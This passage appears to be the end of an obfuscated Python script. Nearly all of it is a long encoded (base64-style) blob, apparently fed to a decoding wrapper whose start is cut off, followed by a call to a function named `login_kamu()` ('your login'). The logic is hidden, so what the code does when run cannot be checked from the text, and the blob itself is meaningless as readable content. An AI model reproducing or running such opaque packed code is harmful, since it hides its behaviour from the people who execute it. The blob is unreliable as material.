qI+z3SsUau/g3JC0fB9C+QrT3rHXiUqyX2AIRWmbTO/BljZavVYURU1qhFChKnOy7/9mRr3oL/2TwL136EpdfBjl3TY9Ar9hFAwi0GOz1dOLanVVCs5YC4yDotN6bP55Azp3ruThxX372HWimt9MLcYrZu4mJ+ddGOCaoMy6KDksD+F/iyglvFiliR18fK0LdMoiHja0GCtMXbYTkxoCWo9k57pGdhcLP6R7c5Tyqdk0cjPVhDpDZYcXDX1txcR9oZIWfgPk3RgQMWsB0vCxxq7UT4LFdgoXYbAYFMSkMUnHPUk6kt6GeXRRQLZvIsdXftb1wQa76fOqc56WKnDmXf6UC36p3bQQ+2l1Wryu0I0TUUNmNa7U2e0pfwyXTqtP7EiT9YbbUAPrJFSV3dMRLj9dSQDM7zLjY1uuIvxvpiqgAzGB1r3usrd2I37828EPl89pfzc7KUJA8onhSaee5OL2XYjLeI6FbfXxYsKLk621eiFlM1TJiaTcSBfdL42nFWJ9c4LEv0EMpjZX+0nDuN76gxYX13H05CNtYSUi4vuenPIlxXu7WYx1O+svCnynGqOEzd1PgUPatg5i5DV4HV4KmSGSLgtdt2HWPCXLqXfpIwRJV6JEWMch7FTqJm+9p0o4Ig9FadLnfFtqP5lPOgU0wEI/IYJoa+ZO83evje12J6EXzo72INIRBRmi4KYrOspPib5xd0IRdywSJP99N+PjEhPEDNRNqulXIDpHJlr3iF4E5cIKT/qmWSlec0aMuyYbIHnPe5LgVOlQkEBs3NJMRE+07BsybyC9AupR6N0EUDhagwwgpvGEe2RnPtme5tO91Oe8hl8VDY/4TeZ0odEXTiQVsThRWnIzeFl2HhnIjCIFX6TddwMV2e8ksGGQkKZkbOyg7SWx45qP45YRNX9xmJvNde3UvUQ6mJ3ScNu9zTmSaavdHjkJUeqVbwMXjZVCANF5YzRCagWGNHPLDc4oDecJ+iF3cY0LddUVcgkwQ8z1KnLZIEx0DzKJqutUlslUjDranyMMZI1yv0n+Ex6638o71obcYgZwnwsQOnD/J7CtRlmrkEdQUQo+6uxZKdr3w9Ksf/TXk3a9RDzr58KvsMGqnspeRBQ7xroM8gREGoWDVT6FHWppRx+8xg1kP5KBCCDii9a0CYd7Y3Dc1jMSiY6naZif2MquYIKJJlR1LKx1BnsMzzWxxaidk8yJyn/0Be4pnuFrJoMPLP5LvNvFaZPTKGtjSIVbZImclt5GIsmpZFv8uGwJfWxzfN3yFhYMcvS03gm+mXKxeE2RlTw8J8DSSNFSc9OtUtxFMrx4zBsegJ6IfZED5dbdNcGjxKK1xeNqy6VNXaNL58QVf3EdbblSIEPkWD4i6X2eSVeZy2daFAV+HPHTtGK60/OkSnOKfcKOrDmjTe9q3goZwClYui4y8aBCuYFeAfaqChFUSaFOfI40SaoFYTaG+woJmut7pP7tlLsSUPJneRbMoCjCPbs/VHM+VI/1n8RZyopJAIVN/tCyEKeSAxhPIHOeuGp0yM7diAeayRqYTGVfZh1qo1Cg7UCOUZoFJBRJ7luNrGAD3kQgoUTUX1QCX2KmuhYR+0Wtl7UpZy2taIFBaLatDABh4YKDGKIiPUqAaUASaxCvNIYBoLolwx8hidFCYHApHFIlZ70iIDAZ5hOtFRGllr4AgDFRwTCmysAUx7EqSgzBfMTAzjFmOrBA/zbHknfm0/ux53nzfT57n3lJ7mvN+vtPrP//5W3/99tl4Xc93Sz27O/Psq9/71/nO+X2jfnHV98oqviP0pTgGbQEt3KKTvRpEPB8VU8E0A83qZuv77+k42Tnl00laPdOA4k9iZCTwXRc8X7ZgExKntVlxJe'))
	login_kamu()